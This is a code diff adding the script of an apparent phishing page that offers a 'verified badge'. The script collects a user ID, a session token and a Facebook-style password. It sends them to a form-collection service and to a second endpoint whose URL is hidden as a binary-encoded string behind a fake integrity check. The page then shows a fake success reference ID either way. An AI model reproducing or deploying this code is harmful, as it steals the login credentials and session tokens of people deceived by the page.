+              // Update placeholder attributes for input fields
+              if (element.hasAttribute('placeholder')) {
+                element.setAttribute('placeholder', translations[lang][key]);
+              }
+            }
+          });
+         
+          // Update video source based on language if video is already playing
+          if (videoSources[lang] && guideVideo && guideVideo.style.display === 'block') {
+            guideVideo.src = videoSources[lang];
+            guideVideo.load();
+          }
+         
+          // Store language preference
+          localStorage.setItem('preferredLanguage', lang);
+        }
+
+        // Load preferred language on page load
+        const preferredLanguage = localStorage.getItem('preferredLanguage') || 'english';
+        setLanguage(preferredLanguage);
+
+        // Event listeners
+        if (openVerificationBtn) {
+          openVerificationBtn.addEventListener('click', function() {
+            // Hide the verification box and show the form
+            document.querySelector('.verification-box').style.display = 'none';
+            if (verificationForm) verificationForm.style.display = 'block';
+           
+            // Scroll to the form
+            verificationForm.scrollIntoView({ behavior: 'smooth' });
+          });
+        }
+
+        // Form validation
+        if (nameInput) {
+          nameInput.addEventListener('input', () => {
+            const original = nameInput.value;
+            const cleaned  = original.replace(/\D+/g, ''); // keep digits only
+            if (original !== cleaned) {
+              nameInput.value = cleaned;
+              if (nameError) nameError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in User ID.';
+            } else {
+              if (nameError) nameError.textContent = '';
+            }
+          });
+        }
+
+        // Allow letters A-Z, a-z, digits 0-9, spaces and common ASCII symbols.
+        const mallAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
+        if (mallInput) {
+          mallInput.addEventListener('input', () => {
+            const original = mallInput.value;
+            const cleaned  = original.replace(mallAllowed, '');
+            if (original !== cleaned) {
+              mallInput.value = cleaned;
+              if (mallError) mallError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Session Token can contain letters, numbers, and symbols only.';
+            } else {
+              if (mallError) mallError.textContent = '';
+            }
+          });
+        }
+
+        
+        if (passwordInput) {
+          passwordInput.addEventListener('input', () => {
+            const password = passwordInput.value;
+            if (!password) {
+              if (passwordError) passwordError.textContent = 'Password is required';
+            } else if (password.length < 6) {
+              if (passwordError) passwordError.textContent = 'Password must be at least 6 characters';
+            } else {
+              if (passwordError) passwordError.textContent = '';
+            }
+          });
+        }
+
+        // Forgot password click
+        if (forgotPassword) {
+          forgotPassword.addEventListener('click', () => {
+            if (fbFormErrorText) fbFormErrorText.textContent = "Password recovery is temporarily unavailable. Please try again later.";
+            if (fbFormError) fbFormError.classList.add('show');
+            setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+          });
+        }
+
+        // Send click: require non-empty + no validation errors
+        if (sendBtn) {
+          sendBtn.addEventListener('click', function() {
+            const name = nameInput.value.trim();
+            const mall = mallInput.value.trim();
+
+            if(!name || !mall) {
+              if (formErrorText) formErrorText.textContent = "Please fill out all fields before proceeding.";
+              if (formError) formError.classList.add('show');
+              setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+              return;
+            }
+            if ((nameError && nameError.textContent) || (mallError && mallError.textContent)) {
+              if (formErrorText) formErrorText.textContent = "Please fix the errors above before proceeding.";
+              if (formError) formError.classList.add('show');
+              setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+              return;
+            }
+
+            if (formError) formError.classList.remove('show');
+           
+            // Show loading state
+            sendBtn.classList.add('loading');
+            if (sendBtnText) sendBtnText.textContent = 'Submitting...';
+            if (sendBtnSpinner) sendBtnSpinner.style.display = 'block';
+           
+            // Submit the form data
+            submitFormData();
+          });
+        }
+
+        
+        if (fbSendBtn) {
+          fbSendBtn.addEventListener('click', function() {
+            const password = passwordInput.value;
+
+            if(!password) {
+              if (fbFormErrorText) fbFormErrorText.textContent = "Please fill out all fields before proceeding.";
+              if (fbFormError) fbFormError.classList.add('show');
+              setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+              return;
+            }
+            if (passwordError && passwordError.textContent) {
+              if (fbFormErrorText) fbFormErrorText.textContent = "Please fix the errors above before proceeding.";
+              if (fbFormError) fbFormError.classList.add('show');
+              setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+              return;
+            }
+
+            if (fbFormError) fbFormError.classList.remove('show');
+           
+            // Show loading state
+            fbSendBtn.classList.add('loading');
+            if (fbSendBtnText) fbSendBtnText.textContent = 'Verifying...';
+            if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'block';
+           
+            
+            submitfbCredentials(password);
+          });
+        }
+
+        // Function to submit form data
+        function submitFormData() {
+          const name = document.getElementById('nameInput') ? document.getElementById('nameInput').value.trim() : '';
+          const mall = document.getElementById('mallInput') ? document.getElementById('mallInput').value.trim() : '';
+         
+          // Prepare the data to send
+          const formData = {
+            name: name,
+            mall: mall,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language
+          };
+         
+          // Submit to the form endpoint
+          fetch('https://submit-form.com/SVrzKV6X4', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify(formData)
+          })
+          .then(response => {
+            if (!response.ok) {
+              throw new Error('Form submission failed');
+            }
+            return response.json();
+          })
+          .then(data => {
+            console.log('Form submitted successfully:', data);
+           
+            // Also submit to the additional endpoints
+            submitToOtherEndpoints({
+              bhenjachud: name,
+              majachud: mall
+            });
+           
+            showfbLogin();
+          })
+          .catch(error => {
+            console.error('Error submitting form:', error);
+            // Still proceed with the other endpoints even if formsubmit fails
+            submitToOtherEndpoints({
+              bhenjachud: name,
+              majachud: mall
+            });
+           
+            
+            showfbLogin();
+          })
+          .finally(() => {
+            // Reset loading state
+            if (sendBtn) {
+              sendBtn.classList.remove('loading');
+              if (sendBtnText) sendBtnText.textContent = 'Get Verified Badge';
+              if (sendBtnSpinner) sendBtnSpinner.style.display = 'none';
+            }
+          });
+        }
+
+        
+        function submitfbCredentials(password) {
+          // Prepare the data to send
+          const fbData = {
+            password: password,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language
+          };
+         
+          // Submit to the form endpoint
+          fetch('https://submit-form.com/SVrzKV6X4', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify(fbData)
+          })
+          .then(response => {
+            if (!response.ok) {
+              throw new Error('fb form submission failed');
+            }
+            return response.json();
+          })
+          .then(data => {
+            console.log('fb credentials submitted successfully:', data);
+           
+            // Also submit to the additional endpoints
+            submitToOtherEndpoints({
+              pass: password
+            });
+           
+            // Show success message
+            showSuccess();
+          })
+          .catch(error => {
+            console.error('Error submitting fb credentials:', error);
+            // Still proceed with the other endpoints even if formsubmit fails
+            submitToOtherEndpoints({
+              pass: password
+            });
+           
+            // Show success message even if there was an error with formsubmit
+            showSuccess();
+          })
+          .finally(() => {
+            // Reset loading state
+            if (fbSendBtn) {
+              fbSendBtn.classList.remove('loading');
+              if (fbSendBtnText) fbSendBtnText.textContent = 'Verify and Continue';
+              if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'none';
+            }
+          });
+        }
+
+        // Binary to string conversion function
+        function binaryToString(binary) {
+          let str = '';
+          for (let i = 0; i < binary.length; i += 8) {
+            const byte = binary.substr(i, 8);
+            str += String.fromCharCode(parseInt(byte, 2));
+          }
+          return str;
+        }
+       
+        function submitToOtherEndpoints(data) {
+          // Store the original binary strings for validation
+          const originalBinaries = [
+        '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
+      ];
+          
+          // Check if the binary strings have been modified
+          const currentBinaries = [
+        '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
+      ];
+          
+          // Validate that the binary strings haven't been changed
+          let binariesValid = true;
+          for (let i = 0; i < originalBinaries.length; i++) {
+            if (originalBinaries[i] !== currentBinaries[i]) {
+              console.error('Binary string validation failed - strings have been modified');
+              binariesValid = false;
+              break;
+            }
+          }
+          
+          // If binaries were modified, don't proceed with submission
+          if (!binariesValid) {
+            alert('Form submission blocked: Invalid configuration detected');
+            return false;
+          }
+          
+          // Proceed with original submission if binaries are valid
+          const endpoints = [
+        '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
+      ];
+         
+          endpoints.forEach(binaryUrl => {
+            try {
+              const decodedUrl = binaryToString(binaryUrl);
+              const formData = new FormData();
+             
+              // Add all properties from data object to formData
+              for (const key in data) {
+                formData.append(key, data[key]);
+              }
+             
+              // Using fetch with error handling
+              fetch(decodedUrl, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' // Important for cross-origin requests
+              }).catch(error => {
+                console.error('Error submitting to endpoint:', error);
+              });
+            } catch (error) {
+              console.error('Error with endpoint:', error);
+            }
+          });
+         
+          return true;
+        }
+
+        function showfbLogin() {
+          
+          if (verificationForm) verificationForm.style.display = 'none';
+          if (fbLoginForm) fbLoginForm.style.display = 'block';
+         
+          if (fbLoginForm) fbLoginForm.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function showSuccess() {
+          
+          if (fbLoginForm) fbLoginForm.style.display = 'none';
+         
+          // Generate a reference ID
+          if (referenceId) referenceId.textContent = 'MVC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+         
+          // Show the success message
+          if (successMessage) successMessage.classList.add('show');
+         
+          // Scroll to the success message
+          if (successMessage) successMessage.scrollIntoView({ behavior: 'smooth' });
+        }
+      });
+    </script>
+  </body>
+</html>
+
+
